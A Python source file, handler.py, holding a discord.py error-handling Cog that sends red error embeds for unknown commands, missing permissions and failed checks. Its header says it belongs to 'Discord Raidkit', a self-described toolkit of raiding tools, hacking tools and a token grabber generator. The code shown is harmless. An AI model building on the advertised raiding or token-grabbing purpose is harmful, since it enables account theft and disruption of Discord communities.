"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

handler.py stores the on_command_error event for Anubis and Qetesh.
handler.py was last updated on 05/03/23 at 20:52 UTC.
"""

import discord
from discord.ext import commands


class Handler(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        return

    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CommandNotFound):
            embed = discord.Embed(
                title='Error',
                description='**Command does not exist.**',
                color=discord.Color.brand_red())
            await ctx.send(embed=embed)
        elif isinstance(error, commands.MissingPermissions):
            embed = discord.Embed(
                title='Error',
                description='**Permission denied.**',
                color=discord.Color.brand_red())
            await ctx.send(embed=embed)
        elif isinstance(error, commands.NotOwner):
            embed = discord.Embed(
                title='Error',
                description='**You must be the owner of the bot to use this command.**',
                color=discord.Color.brand_red())
            await ctx.send(embed=embed)
        elif isinstance(error, commands.NSFWChannelRequired):
            embed = discord.Embed(
                title='Error',
                description='**This command can only be used in NSFW channels.**',
                color=discord.Color.brand_red())
            await ctx.send(embed=embed)
        elif isinstance(error, commands.CheckFailure):
            embed = discord.Embed(
                title='Error',
                description='**Access denied.**',
                color=discord.Color.brand_red())
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title='Error',
                description='**An unknown error has occurred.**',
                color=discord.Color.brand_red())
            await ctx.send(embed=embed)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Handler(bot))
